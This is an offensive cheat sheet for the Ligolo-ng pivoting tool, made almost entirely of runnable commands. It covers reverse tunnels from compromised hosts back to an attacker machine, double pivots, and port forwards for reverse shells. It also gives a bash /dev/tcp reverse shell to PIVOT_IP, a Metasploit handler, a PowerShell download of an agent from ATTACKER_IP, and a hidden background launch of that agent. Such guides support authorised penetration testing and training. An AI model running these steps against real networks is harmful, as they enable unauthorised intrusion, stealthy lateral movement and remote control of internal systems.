# Ligolo-ng Cheat Sheet

> **Ligolo-ng** — A lightweight and fast pivoting tool that creates reverse tunnels using a TUN interface. No SOCKS proxy needed.

---

## 📦 Installation

### Download Binaries
```bash
# Proxy (attacker machine)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64

# Agent (target/pivot machine)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64

# Windows agent
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_windows_amd64.exe

# Make executable
chmod +x proxy_linux_amd64 agent_linux_amd64
```

### Create TUN Interface (Attacker)
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

---

## 🚀 Basic Usage

### 1. Start the Proxy (Attacker)
```bash
# With self-signed certificate
./proxy -selfcert 
```

### 2. Connect the Agent (Target / Pivot Machine)
```bash
# Linux
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

### 3. Set Up the Tunnel (Proxy Console)
```
ligolo-ng » session          # Select the active session
ligolo-ng » ifconfig         # View target network interfaces
ligolo-ng » autoroute        # Configuration Auto Route
ligolo-ng » start --tun ligolo            # Start the tunnel
```


## 🔁 Double Pivot

```
Attacker → Pivot1 → Pivot2 → Internal Network
```

### Open a New Listener on Pivot1
```
ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

Host 2
./agent -connect PIVOT1:11602 -ignore-cert
```

### Select New Session and Add Route
```
ligolo-ng » session          # Select the Pivot2 session
ligolo-ng » start
```
```bash
sudo ip route add 172.16.0.0/24 dev ligolo
```

---

## 📡 Listeners (Port Forwarding)

### Forward Attacker Port to Target
```
# Attacker:4444 → Target:4444  (for reverse shells)
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Attacker:8080 → Internal host:80
ligolo-ng » listener_add --addr 0.0.0.0:8080 --to 192.168.1.100:80
```

### Manage Listeners
```
ligolo-ng » listener_list        # List all active listeners
ligolo-ng » listener_stop 0      # Stop listener by ID
```

---

## ⌨️ Console Commands

| Command | Description |
|---------|-------------|
| `session` | Select an agent session |
| `sessions` | List all active sessions |
| `start` | Start the tunnel |
| `stop` | Stop the tunnel |
| `ifconfig` | Show target network interfaces |
| `listener_add` | Add a port forwarding rule |
| `listener_list` | List active listeners |
| `listener_stop <id>` | Remove a listener by ID |
| `info` | Show current session info |
| `help` | Show help menu |
| `exit` | Exit the proxy |

---

## 🛠️ Common Scenarios

### Nmap Scan Against Internal Network
```bash
# After adding the route — no proxychains needed!
nmap -sV 192.168.1.0/24
nmap -sC -sV -p- 10.10.10.50
```

### Catch a Reverse Shell from Internal Host
```bash
# Step 1 — Add listener on proxy
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Step 2 — Trigger reverse shell on target
bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1

# Step 3 — Listen on attacker
nc -lvnp 4444
```

### Access Internal Web Services
```bash
# After adding the route
curl http://192.168.1.100:8080
firefox http://10.10.10.50
```

### Metasploit Integration
```bash
# Step 1 — Add listener
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Step 2 — Configure MSF handler
use exploit/multi/handler
set LHOST 0.0.0.0
set LPORT 4444
run
```

### File Transfer via Listener
```bash
# Expose HTTP server on attacker through pivot
ligolo-ng » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000

# On attacker — serve files
python3 -m http.server 8000

# On deep internal host — download
wget http://PIVOT_IP:8000/file.sh
```

---

## 🪟 Windows Specifics

```powershell
# Download agent via PowerShell
Invoke-WebRequest -Uri "http://ATTACKER_IP/agent.exe" -OutFile "agent.exe"

# Start the agent
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Run silently in background
Start-Process -WindowStyle Hidden -FilePath ".\agent.exe" -ArgumentList "-connect ATTACKER_IP:11601 -ignore-cert"
```

---

## 🔍 Troubleshooting

| Problem | Fix |
|---------|-----|
| TUN interface missing | `sudo ip tuntap add user $(whoami) mode tun ligolo` |
| Connection refused | Check firewall, add `-ignore-cert` flag |
| Route not working | Verify with `ip route show` |
| Session not appearing | Re-run `sessions` command |
| Permission denied | Run with `sudo` |
| Agent exits immediately | Check connectivity to proxy port |

### Quick Diagnostics
```bash
# Is the interface up?
ip link show ligolo

# Are routes in place?
ip route show | grep ligolo

# Test connectivity after route is added
ping 192.168.1.1
curl http://192.168.1.100
```

---

## ⚡ Quick Start (TL;DR)

```bash
# ── ATTACKER ──────────────────────────────────────────
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# ── TARGET (separate terminal) ────────────────────────
./agent -connect ATTACKER_IP:11601 -ignore-cert

# ── PROXY CONSOLE ─────────────────────────────────────
session        # → select session 1
start          # → tunnel is up
# Press Ctrl+C to return to console

# ── ATTACKER (new terminal) ───────────────────────────
sudo ip route add 192.168.X.0/24 dev ligolo
# Done! You can now reach 192.168.X.0/24 directly.
```

---

## 📚 References

- **GitHub:** https://github.com/nicocha30/ligolo-ng
- **Releases:** https://github.com/nicocha30/ligolo-ng/releases

---

*Prepared for Ligolo-ng v0.6+*
